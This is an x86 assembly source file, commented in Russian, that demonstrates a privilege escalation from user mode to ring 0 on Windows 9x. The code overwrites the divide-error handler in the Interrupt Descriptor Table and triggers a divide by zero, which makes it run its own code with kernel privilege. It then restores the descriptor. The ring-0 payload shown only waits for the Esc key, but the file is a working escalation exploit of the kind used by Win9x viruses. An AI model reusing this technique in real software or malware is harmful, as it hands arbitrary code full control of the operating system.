; Переход в нулевое кольцо под Win9x 
; Метод: IDT (Interrupt Descriptor Table, таблица дескрипторов прерываний)

.586p
.model flat

callW           macro   x
                extern  x:PROC
                call    x
                endm

.data

_Start:
go_to_ring0:    pusha

                call    __pop1          ; SEH
                mov     esp, [esp+8]
                jmp     __exit
__pop1:         push    dword ptr fs:[0]
                mov     fs:[0], esp

                push    EDI             ; получить адрес IDT
                sidt    [esp-2]
                pop     EDI

                add     EDI, 8*00h      ; адрес дескриптора INT 00h

                fild    qword ptr [EDI] ; сохранить дескриптор

                call    __pop2          ; получить адрес нового
                                        ; обработчика исключения

                call    ring0_proc      ; вызвать в ring0

                dec     EAX             ; для нормаьного повтора DIV-а
                iret                    ; возврат из прерывания в ring-3

__pop2:         pop     word ptr [EDI]  ; установить новый оффсет
                pop     word ptr [EDI+6]; обработчика прерывания

                xor     EAX, EAX
                xor     EDX, EDX
                div     EAX             ; вызвать INT 00h

                fistp   qword ptr [EDI] ; восстановить дескриптор

__exit:         pop     dword ptr fs:[0]; SEH
                pop     EAX

                popa
                ret

; код в нулевом кольце!
ring0_proc:                                ; r0 start
                push    ss ss
                pop     ds es

                pushad

; Ждем нажатия Esc
WaitESC:                                   
                in        AL, 60h
                cmp       AL, 1
                jne       WaitESC

                popad
                retn                       ; r0 end
.code

start:
                call        _Start
exit:
                push        00000000h
                callW       ExitProcess
end start